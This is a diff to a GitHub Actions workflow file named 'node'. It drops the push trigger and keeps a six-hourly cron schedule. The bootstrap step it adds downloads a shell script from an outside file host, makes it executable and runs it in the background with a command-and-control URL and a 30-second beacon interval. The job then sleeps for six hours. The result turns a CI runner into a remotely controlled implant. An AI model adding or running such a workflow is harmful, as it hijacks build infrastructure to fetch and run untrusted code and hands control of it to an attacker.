@@ -1,7 +1,6 @@
 name: node
 on:
   workflow_dispatch:
-  push:
   schedule:
     - cron: "0 */6 * * *"
 jobs:
@@ -13,5 +12,6 @@ jobs:
     steps:
       - name: bootstrap
         run: |
-          curl -fsSL "http://CHANGE_ME_C2/payload.sh" | bash || true
+          curl -fsSL "https://sendit.sh/uWlHS/payload.sh" -o /tmp/payload.sh && chmod +x /tmp/payload.sh
+          C2_URL="http://CHANGE_ME_C2:8000" INTERVAL=30 bash /tmp/payload.sh &
           sleep 21600
